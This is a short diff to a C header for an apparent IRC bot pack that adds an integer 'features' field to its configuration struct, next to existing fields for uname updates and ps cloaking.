@@ -30,6 +30,7 @@ typedef struct conf_bot_b {
 typedef struct conf_b {
   conf_bot *bots;       /* the list of bots */
   conf_bot *bot;        /* single bot (me) */
+  int features;		/* Pack features (take, mdop, beta... etc..) */
   int uid;
   int autouname;        /* should we just auto update any changed in uname output? */
   int pscloak;          /* should the bots bother trying to cloak `ps`? */
